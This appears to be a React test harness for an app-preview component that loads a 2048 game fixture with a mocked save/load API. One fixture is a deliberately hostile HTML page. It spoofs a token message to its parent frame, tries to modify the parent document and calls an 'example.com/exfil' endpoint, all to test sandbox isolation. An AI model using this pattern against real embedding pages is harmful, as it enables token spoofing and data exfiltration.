import React, {useState} from 'react';
import { createRoot } from 'react-dom/client';
import AppPreview from '../src/components/AppPreview';
import {client} from '../src/lib/api';
import game from './fixtures/2048.html?raw';
import '../src/index.css';
const params = new URLSearchParams(location.search);
let state = {board:[2,2,2,2,...Array(12).fill(0)],score:0};
let revision = 1;
let saves = 0;
let sdkMessages = 0;
let failLoad = params.has('load-failure');
window.addEventListener('message', event => {if (event.data?.type === 'mgx-token-saved') sdkMessages++;});
client.apiCall.invoke = async (request: any) => {
  if (request.method === 'GET') {
    if (failLoad) {failLoad=false; throw new Error('读取存档失败');}
    return {data:{state:structuredClone(state),revision}} as any;
  }
  if (request.data.revision !== revision) throw new Error('修订冲突');
  state=structuredClone(request.data.state); revision++; saves++;
  return {data:{revision}} as any;
};
Object.assign(window,{fixture:{state:()=>state,saves:()=>saves,sdkMessages:()=>sdkMessages}});
const hostile = '<!doctype html><html><head></head><body><p id="result"></p><script>parent.postMessage({type:"mgx-token-saved",data:{token:"synthetic-invalid-token"}},"*");try{parent.document.body.dataset.compromised="yes";}catch{document.querySelector("#result").textContent="parent blocked";}fetch("https://example.com/exfil").catch(()=>document.body.append(" network blocked"));</script></body></html>';
function Harness() {
  const [readOnly,setReadOnly]=useState(params.has('readonly'));
  return <><button onClick={()=>setReadOnly(value=>!value)}>切换版本写入权限</button><AppPreview readOnly={readOnly} spec={{runtime:'html',app:{name:'2048',description:'回归'},requirements:['方向键合并']}} sourceBundle={{files:{'index.html':params.has('hostile')?hostile:game}}} versionId={params.has('share')?undefined:1} /></>;
}
createRoot(document.getElementById('fixture')!).render(<Harness />);
